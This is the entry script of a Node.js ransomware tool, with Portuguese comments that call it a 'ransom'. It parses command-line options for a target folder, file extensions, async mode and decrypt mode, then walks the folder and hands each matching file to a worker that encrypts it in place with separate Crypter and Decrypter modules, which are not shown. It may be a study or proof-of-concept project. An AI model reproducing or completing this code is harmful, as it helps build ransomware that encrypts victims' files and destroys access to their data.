const discovery = require("./discovery");
const syncWorker = require("./sync");
const asyncWorker = require("./async");
///const path = require("path");
const chalk = require("chalk");
const print = console.log;
const argParser = require("minimist");
// desestrutura os argumentos do cli para entender o que está acontecendo
const arguments = argParser(process.argv.slice(2), {
  default: {
    folder: null, // pasta inicial
    extensions: null, // extensões de arquivos
    async: false, // execute encryption assyncronously
    d: false // decrypt mode
  }
});

// configuração das mensagens no console
const warning = chalk.keyword("orange"); // colorir mensagens na tela
const primary = chalk.green;

// recebe os parametros da cli
const { folder, extensions, async, d } = arguments;

// define a função de cifragem/decifragem
var cipherFn = d
  ? require("./Ciphers/Decrypter")
  : require("./Ciphers/Crypter");
// define o modo de operação do ransom
var worker = async ? asyncWorker : syncWorker; // a função responsável por executar a operação de escrita
// pega as extensões da cli
var exts = extensions ? extensions.replace(".", "").split(",") : [];
if (folder) {
  print(primary("Iniciando operação!"));
  discovery(
    folder,
    {
      extensions: exts
    },
    (filename, stats) => {
      worker(filename, cipherFn);
    }
  );
} else {
  print(
    warning("Você precisa especificar uma pasta para encryptação dos arquivos!")
  );
  print(primary("Utilize a opção --folder"));
}
